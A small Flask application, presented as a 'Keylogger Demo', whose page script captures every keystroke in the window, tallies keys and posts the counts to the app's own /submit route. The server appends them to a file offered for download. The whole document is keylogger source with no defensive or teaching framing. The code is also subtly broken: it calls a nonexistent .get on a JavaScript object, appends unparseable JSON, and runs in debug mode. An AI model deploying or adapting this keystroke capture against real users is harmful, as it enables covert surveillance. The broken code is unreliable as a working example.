from flask import Flask, request, make_response
import os
import json

app = Flask(__name__)

@app.route("/")
def index():
    return """
    <html>
        <head>
            <script>
                function keylogger() {
                    let outputDict = {};
                    let wordCount = 0;
                    document.onkeydown = function(e) {
                        outputDict[e.key] = outputDict.get(e.key, 0) + 1;
                        wordCount++;
                        if (wordCount % 500 === 0) {
                            let xhr = new XMLHttpRequest();
                            xhr.open("POST", "/submit");
                            xhr.setRequestHeader("Content-Type", "application/json");
                            xhr.send(JSON.stringify(outputDict));
                            outputDict = {};
                        }
                    }
                }
            </script>
        </head>
        <body onload="keylogger();">
            <h1>Keylogger Demo</h1>
            <p>This is a demo of a keylogger that logs every keystroke you make in this window.</p>
            <p>You can view the logged output by visiting the link below:</p>
            <p><a href="/output">View Output</a></p>
        </body>
    </html>
    """

@app.route("/submit", methods=["POST"])
def submit():
    outputDict = json.loads(request.data)
    with open("output.json", "a") as f:
        json.dump(outputDict, f)
    return ""

@app.route("/output")
def output():
    with open("output.json", "r") as f:
        outputDict = json.load(f)
    response = make_response(json.dumps(outputDict))
    response.headers.set("Content-Disposition", "attachment", filename="output.json")
    return response

if __name__ == "__main__":
    app.run(debug=True, port=int(os.environ.get("PORT", 8080)))
